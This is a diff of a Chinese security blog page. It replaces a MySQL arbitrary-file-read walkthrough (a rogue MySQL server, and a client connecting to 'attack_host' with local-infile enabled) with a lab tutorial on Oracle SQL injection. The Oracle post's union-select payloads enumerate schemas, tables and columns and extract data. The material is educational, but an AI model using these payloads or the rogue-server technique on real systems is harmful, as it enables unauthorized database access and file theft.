@@ -6,22 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://yd0ng.github.io">
-  <title>MySQL任意文件读取漏洞复现 | 不知名网络安全选手的博客</title>
+  <title>Oracle注入初探 | 不知名网络安全选手的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="MySQL任意文件读取漏洞复现">
+  <meta name="description" content="昨天总结了一下自己还比较熟悉的MySQL注入，今天记录一下没注入过的Oracle数据库的注入方式">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MySQL任意文件读取漏洞复现">
-<meta property="og:url" content="https://yd0ng.github.io/2020/09/08/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="Oracle注入初探">
+<meta property="og:url" content="https://yd0ng.github.io/2020/09/09/Oracle%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/index.html">
 <meta property="og:site_name" content="不知名网络安全选手的博客">
-<meta property="og:description" content="MySQL任意文件读取漏洞复现">
+<meta property="og:description" content="昨天总结了一下自己还比较熟悉的MySQL注入，今天记录一下没注入过的Oracle数据库的注入方式">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://yd0ng.github.io/2020/09/08/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.png">
-<meta property="article:published_time" content="2020-09-08T14:40:56.000Z">
-<meta property="article:modified_time" content="2020-09-08T14:47:39.361Z">
+<meta property="article:published_time" content="2020-09-09T04:24:28.000Z">
+<meta property="article:modified_time" content="2020-09-09T09:14:50.228Z">
 <meta property="article:author" content="yd0ng">
-<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://yd0ng.github.io/2020/09/08/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.png">
   
   
     <link rel="icon" href="/themes/yilia/source/">
@@ -137,42 +135,52 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-MySQL任意文件读取漏洞复现" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Oracle注入初探" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      MySQL任意文件读取漏洞复现
+      Oracle注入初探
     </h1>
   
 
         
-        <a href="/2020/09/08/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-  	<time datetime="2020-09-08T14:40:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-08</time>
+        <a href="/2020/09/09/Oracle%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/" class="archive-article-date">
+  	<time datetime="2020-09-09T04:24:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>MySQL任意文件读取漏洞复现</p>
+        <p>昨天总结了一下自己还比较熟悉的MySQL注入，今天记录一下没注入过的Oracle数据库的注入方式</p>
 <a id="more"></a>
 
-<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h2><p>攻击机伪造mysql服务器并启动服务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;allyshka&#x2F;Rogue-MySql-Server</span><br><span class="line">cd Rogue-MySql-Server</span><br><span class="line">python rogue_mysql_server.py</span><br></pre></td></tr></table></figure>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>可以用docker搭建Oracle注入环境，我这里就直接使用墨者学院的Oracle漏洞环境了</p>
+<h1 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h1><h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><p>判断是否存在注入与MySQL基本一致<br>由以下四步基本可以判断出存在数字型注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">new_list.php?id&#x3D;1   &#x2F;&#x2F;页面正常，有回显</span><br><span class="line">new_list.php?id&#x3D;1&#39;  &#x2F;&#x2F;页面正常，无回显</span><br><span class="line">new_list.php?id&#x3D;1 and 1&#x3D;1   &#x2F;&#x2F;页面正常，有回显</span><br><span class="line">new_list.php?id&#x3D;1 and 1&#x3D;2   &#x2F;&#x2F;页面正常，无回显</span><br></pre></td></tr></table></figure>
 
-<h2 id="客户机"><a href="#客户机" class="headerlink" title="客户机"></a>客户机</h2><p>客户机连接攻击机并允许load操作</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p -h attack_host --enable-local-infile</span><br></pre></td></tr></table></figure>
+<h2 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count (*) from dual)&gt;0 &#x2F;&#x2F;正常为Oracle，报错为MySQL，此处回显正常，所以为Oracle</span><br></pre></td></tr></table></figure>
 
-<h2 id="攻击成功"><a href="#攻击成功" class="headerlink" title="攻击成功"></a>攻击成功</h2><p><img src="/2020/09/08/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.png" alt></p>
-<h1 id="漏洞成因及修补方式"><a href="#漏洞成因及修补方式" class="headerlink" title="漏洞成因及修补方式"></a>漏洞成因及修补方式</h1><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><ul>
-<li>客户端开启了load data，允许读取文件</li>
-</ul>
-<h2 id="修补方式"><a href="#修补方式" class="headerlink" title="修补方式"></a>修补方式</h2><ul>
-<li>禁用load读取文件</li>
-</ul>
+<h2 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h2><p>判断列数与MySQL一致</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by</span><br></pre></td></tr></table></figure>
+
+<h2 id="判断显示位和数据类型"><a href="#判断显示位和数据类型" class="headerlink" title="判断显示位和数据类型"></a>判断显示位和数据类型</h2><p>此处不同于MySQL，根据以下条件，判断显示位数据类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select null,null from dual        &#x2F;&#x2F;正常返回两个null，则字段都为数字型</span><br><span class="line">union select &#39;null&#39;,null from dual      &#x2F;&#x2F;正常返回两个null，则两个字段分别为字符型和数字型</span><br><span class="line">union select &#39;null&#39;,&#39;null&#39; from dual    &#x2F;&#x2F;正常返回两个null，则字段都会字符型</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看当前数据库版本信息"><a href="#查看当前数据库版本信息" class="headerlink" title="查看当前数据库版本信息"></a>查看当前数据库版本信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select &#39;1&#39;,(select banner from sys.v_$version where rownum&#x3D;1) from dual</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select &#39;1&#39;,(select owner from all_tables where rownum&#x3D;1) from dual</span><br><span class="line">union select &#39;1&#39;,(select owner from all_tables where rownum&#x3D;1 and owner &lt;&gt;&#39;SYS&#39;) from dual</span><br><span class="line">以此类推得到所有数据库</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看表名"><a href="#查看表名" class="headerlink" title="查看表名"></a>查看表名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select &#39;1&#39;,table_name from user_tables where rownum&#x3D;1</span><br><span class="line">union select &#39;1&#39;,table_name from user_tables where rownum&#x3D;1 and table_name &lt;&gt; &#39;LOGMNR_PARAMETER$&#39;</span><br><span class="line">以此类推得到所有表</span><br></pre></td></tr></table></figure>
+
+<h2 id="查看列名"><a href="#查看列名" class="headerlink" title="查看列名"></a>查看列名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select &#39;1&#39;,column_name from user_tab_columns where table_name&#x3D;&#39;HR&#39; and rownum&#x3D;1</span><br><span class="line">以此类推得到所有列名</span><br></pre></td></tr></table></figure>
+
+<h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select &#39;1&#39;,Column_name from table_name</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Oracle和MySQL的注入基本是大同小异吧，思路差不太多，差的就是一些Oracle语法和内置数据库啥的，简单一写，后面会总结学习一下Oracle的注入技巧</p>
 
       
       
@@ -220,7 +228,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Web安全</a>
         		</li>
       		
 		</ul>
@@ -276,7 +284,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://yd0ng.github.io/2020/09/08/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://yd0ng.github.io/2020/09/09/Oracle%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -290,18 +298,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/09/09/Oracle%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Oracle注入初探
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/09/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E6%B3%A8%E5%85%A5Tricks-MySQL/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">深入理解SQL注入及注入Tricks-MySQL</div>
+    <a href="/2020/09/08/MySQL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">MySQL任意文件读取漏洞复现</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -328,7 +327,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#复现过程"><span class="toc-number">1.</span> <span class="toc-text">复现过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击机"><span class="toc-number">1.1.</span> <span class="toc-text">攻击机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#客户机"><span class="toc-number">1.2.</span> <span class="toc-text">客户机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击成功"><span class="toc-number">1.3.</span> <span class="toc-text">攻击成功</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞成因及修补方式"><span class="toc-number">2.</span> <span class="toc-text">漏洞成因及修补方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#成因"><span class="toc-number">2.1.</span> <span class="toc-text">成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修补方式"><span class="toc-number">2.2.</span> <span class="toc-text">修补方式</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#注入过程"><span class="toc-number">2.</span> <span class="toc-text">注入过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#判断是否存在注入"><span class="toc-number">2.1.</span> <span class="toc-text">判断是否存在注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#判断数据库类型"><span class="toc-number">2.2.</span> <span class="toc-text">判断数据库类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#判断列数"><span class="toc-number">2.3.</span> <span class="toc-text">判断列数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#判断显示位和数据类型"><span class="toc-number">2.4.</span> <span class="toc-text">判断显示位和数据类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看当前数据库版本信息"><span class="toc-number">2.5.</span> <span class="toc-text">查看当前数据库版本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看数据库"><span class="toc-number">2.6.</span> <span class="toc-text">查看数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看表名"><span class="toc-number">2.7.</span> <span class="toc-text">查看表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看列名"><span class="toc-number">2.8.</span> <span class="toc-text">查看列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查询数据"><span class="toc-number">2.9.</span> <span class="toc-text">查询数据</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
                     </div>
                 </span>
             </div>
